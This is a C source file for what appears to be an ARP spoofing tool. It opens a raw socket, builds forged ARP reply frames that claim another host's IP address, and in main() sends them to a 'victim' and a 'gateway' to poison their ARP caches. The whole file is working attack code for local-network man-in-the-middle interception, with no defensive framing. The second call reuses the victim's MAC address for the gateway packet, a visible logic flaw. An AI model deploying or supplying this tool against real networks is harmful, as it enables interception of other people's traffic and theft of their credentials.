#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <linux/if.h>
#include <linux/types.h>
#include <sys/ioctl.h>

#include "nt_headers.h"
#include "util.h"
#include "arg_parser.h"

#define ETH_P_ARP 0x0806

void send_arp_packet(char* interface, char* target_ip, char* target_mac, char* spoof_ip) {
	int sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if(sock < 0) {
		perror("while creating raw socket");
		exit(-1);
	}

	// getting the index of the interface to send the packets on
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	
	if((ioctl(sock, SIOCGIFINDEX, &ifr)) < 0) {
		perror("while getting the interface index");
		exit(-1);
	}

	// getting the mac address of the current interface
	struct ifreq ifr_macAddr;
	memset(&ifr_macAddr, 0, sizeof(ifr_macAddr));
	strncpy(ifr_macAddr.ifr_name, interface, IFNAMSIZ-1);

	if((ioctl(sock, SIOCGIFHWADDR, &ifr_macAddr)) < 0) {
		perror("while getting the mac address of the current interface");
		exit(-1);
	}

	// getting the ip of the interface
	struct ifreq ifr_ip;
	memset(&ifr_ip, 0, sizeof(ifr_ip));
	strncpy(ifr_ip.ifr_name, interface, IFNAMSIZ-1);

	if((ioctl(sock, SIOCGIFADDR, &ifr_ip)) < 0) {
		perror("while getting the ip of the interface");
		exit(-1);
	}

	char* send_buffer = (char*)malloc(sizeof(char)*64);
	memset(send_buffer, 0, 64);

	int total_len = 0;
	
	struct ethhdr *eth = (struct ethhdr *)(send_buffer);

	// filling up my source mac address
	eth->h_source[0] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[0]);
	eth->h_source[1] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[1]);
	eth->h_source[2] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[2]);
	eth->h_source[3] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[3]);
	eth->h_source[4] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[4]);
	eth->h_source[5] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[5]);

	// filling up dest mac address
	int dst_mac[6];
	extract_mac(target_mac, dst_mac);

	eth->h_dest[0] = dst_mac[0];
	eth->h_dest[1] = dst_mac[1];
	eth->h_dest[2] = dst_mac[2];
	eth->h_dest[3] = dst_mac[3];
	eth->h_dest[4] = dst_mac[4];
	eth->h_dest[5] = dst_mac[5];
	eth->h_proto = htons(ETH_P_ARP);
	total_len += sizeof(struct ethhdr);

	// // creating the arp header
	struct arphdr *arp = (struct arphdr*)(send_buffer+total_len);
	
	arp->hd_type[0] = 0x0;
	arp->hd_type[1] = 0x1;
	arp->ip_v[0] = 0x8;
	arp->ip_v[1] = 0x0;
	arp->hd_s = 0x6;
	arp->ip_s = 0x4;
	arp->op_code[0] = 0x0;
	arp->op_code[1] = 0x2;
	arp->src_mac[0] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[0]);
	arp->src_mac[1] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[1]);
	arp->src_mac[2] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[2]);
	arp->src_mac[3] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[3]);
	arp->src_mac[4] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[4]);
	arp->src_mac[5] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[5]);

	// char* src_ip = inet_ntoa((((struct sockaddr_in *)&(ifr_ip.ifr_addr))->sin_addr));

	int ip[4];
	extract_ip(spoof_ip, ip);

	arp->src_ip[0] = (unsigned char)ip[0];
	arp->src_ip[1] = (unsigned char)ip[1];
	arp->src_ip[2] = (unsigned char)ip[2];
	arp->src_ip[3] = (unsigned char)ip[3];

	arp->dst_mac[0] = dst_mac[0];
	arp->dst_mac[1] = dst_mac[1];
	arp->dst_mac[2] = dst_mac[2];
	arp->dst_mac[3] = dst_mac[3];
	arp->dst_mac[4] = dst_mac[4];
	arp->dst_mac[5] = dst_mac[5];

	int dst_ip[4];
	extract_ip(target_ip, dst_ip);

	arp->dst_ip[0] = dst_ip[0];
	arp->dst_ip[1] = dst_ip[1];
	arp->dst_ip[2] = dst_ip[2];
	arp->dst_ip[3] = dst_ip[3];

	total_len += sizeof(struct arphdr);

	struct sockaddr_ll sadr_ll;
	sadr_ll.sll_ifindex = ifr.ifr_ifindex; // index of interface
	sadr_ll.sll_halen = ETH_ALEN; // length of destination mac address
	sadr_ll.sll_addr[0] = dst_mac[0];
	sadr_ll.sll_addr[1] = dst_mac[1];
	sadr_ll.sll_addr[2] = dst_mac[2];
	sadr_ll.sll_addr[3] = dst_mac[3];
	sadr_ll.sll_addr[4] = dst_mac[4];
	sadr_ll.sll_addr[5] = dst_mac[5];

	int send_len = sendto(sock,send_buffer,64,0,(const struct sockaddr*)&sadr_ll,sizeof(struct sockaddr_ll));
	if(send_len<0)
	{
		perror("while sending the packet");
		exit(-1);
	}

	printf("Sent ARP Replay Packet for %s as %s\n", target_ip, spoof_ip);

	close(sock);
}

int main(int argc, char* argv[]) {

	char interface[24] = {0};
	char target_ip[16] = {0};
	char target_mac[18] = {0};
	char spoof_ip[16] = {0};

	int result = parse_args(argv, argc, interface, target_ip, target_mac, spoof_ip);

	if(!result) {
		exit(-1);
	}

	// sending spoof packet to victim
	send_arp_packet(interface, target_ip, target_mac, spoof_ip);

	// sending spoof packet to gateway
	send_arp_packet(interface, spoof_ip, target_mac, target_ip);
}
